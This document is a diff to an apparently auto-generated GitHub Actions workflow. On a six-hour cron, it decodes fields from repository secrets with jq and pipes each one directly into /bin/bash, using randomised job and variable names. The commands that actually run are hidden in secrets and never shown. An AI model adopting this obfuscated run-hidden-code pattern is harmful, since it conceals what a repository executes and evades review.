@@ -2,21 +2,24 @@ name: shangwangcha6178
 on:
   workflow_dispatch:
   schedule:
-    - cron: '27 2/6 * * *'
-
+    - cron: '40 4/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: shangwangcha6178
         env:
-          ssf52834: ${{ secrets.ssf52834 }}
+          dtzeg797: ${{ secrets.dtzeg797 }}
         run: |
-          echo $ssf52834 | jq -r .xinds950 | /bin/bash
-          echo $ytuzs341 | jq -r .hxx9883 | /bin/bash
-          echo $bi4309 | jq -r .cf987 | /bin/bash
-          echo $php1 | jq -r .ejxx9571 | /bin/bash
-          echo $odgd55638 | jq -r .yarup3296 | /bin/bash
-          echo $fzfv24 | jq -r .srp95650 | /bin/bash
+          echo $dtzeg797 | jq -r .lacs2790 | /bin/bash
+          echo $divmt2965 | jq -r .hwlm9487 | /bin/bash
+          echo $em4 | jq -r .vqc75117 | /bin/bash
+          echo $xfna6985 | jq -r .dywlt2862 | /bin/bash
+          echo $lov8934 | jq -r .zca2249 | /bin/bash
+          echo $zy68050 | jq -r .w96983 | /bin/bash
+          echo $w99 | jq -r .jbhzo1753 | /bin/bash
+          echo $z80 | jq -r .jqqol3976 | /bin/bash
+          echo $yojse7 | jq -r .oo02 | /bin/bash
 
